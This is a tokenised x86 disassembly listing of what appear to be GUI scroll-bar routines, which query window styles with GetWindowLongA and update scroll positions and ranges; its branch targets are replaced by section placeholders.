mov [ edx + 0x8 ] ax
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41a9ac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41abac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42d2cc
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
sub_41a9f4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x38 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444824
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
mov edx [ ebp - 0x4 ]
and al [ edx + 0x51 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_41aa78
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444824
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
mov edx [ ebp - 0x4 ]
and al [ edx + 0x51 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_41aaf4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x1f8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0xb4 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41b408
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_41b408
jmp r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_4307d8
call sub_41aa78
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_4307d8
call sub_41a9f4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_41abac
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0x100000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x200000
xor eax eax
jmp r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call GetWindowLongA
and eax [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov al 0x1
sub_41ac00
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x8 ] 0x100000
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call GetWindowLongA
and eax [ ebp - 0x8 ]
setne [ ebp - 0x3 ]
mov al [ ebp - 0x3 ]
pop ecx
pop ecx
pop ebp
retn
mov [ ebp - 0x8 ] 0x200000
sub_41ac44
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] dx
mov [ ebp - 0x2 ] ax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ax [ ebp - 0x2 ]
call sub_41ac00
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ax [ ebp - 0x2 ]
call sub_41ac00
pop ecx
test al al
je r-xdata
movzx eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
neg eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
mov [ ebp - 0x8 ] eax
sub_41acd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_41ac44
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42c25c
add ebx eax
mov [ ebp - 0x10 ] ebx
push ebp
mov dx 0x15
xor eax eax
call sub_41ac44
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42c2b0
add ebx eax
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41ad54
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41acd0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
setl [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41ad7c
push ebp
mov ebp esp
add esp 0xffffffdc
mov [ ebp - 0x24 ] 0x1c
mov [ ebp - 0x20 ] 0x10
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movsx eax [ eax + 0x6 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
sub_41ade8
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_41aff7 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41acd0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41acd0
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
push ebp
call sub_41ad7c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
push [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
push ebp
call sub_41ad7c
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_4444a4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax [ ebp - 0x20 ]
push eax
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
dec [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
jmp r-xdata
sub_41b118
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24 ] edx
sub_41b184
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x28 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
sub_41b1c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx 0x80000014
mov eax [ ebp - 0x4 ]
call sub_41b184
sub_41b1fc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x20 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xa ] 0x1
mov [ ebp - 0xa ] 0x0
jmp r-xdata
movzx eax [ ebp - 0xa ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
push eax
movzx eax [ ebp - 0xa ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx [ ebp - 0x14 ]
sub ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434140
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434140
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41a7a4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x238 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x238 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41b32c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
sub_41b398
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x34 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
sub_41b3d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x38 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
sub_41b408
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
sub_41b440
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x1f8 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b408
pop ecx
pop ecx
pop ebp
retn
sub_41b470
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov al [ eax + 0x1f8 ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41b494
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41bae8
pop ecx
pop ecx
pop ebp
retn
sub_41b4b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
neg al
sbb eax eax
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call sub_4440d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call sub_4440d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call sub_4440d8
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_40e410
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call sub_4440d8
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
call sub_4440d8
sub_41b604
push ebp
mov ebp esp
add esp 0xffffffdc
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x24 ] 0x1c
mov [ ebp - 0x20 ] 0x17
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_41acd0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
jge r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov ecx 0xa
xor edx edx
div ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_41acd0
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x44 ]
call sub_41b4b8
pop ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
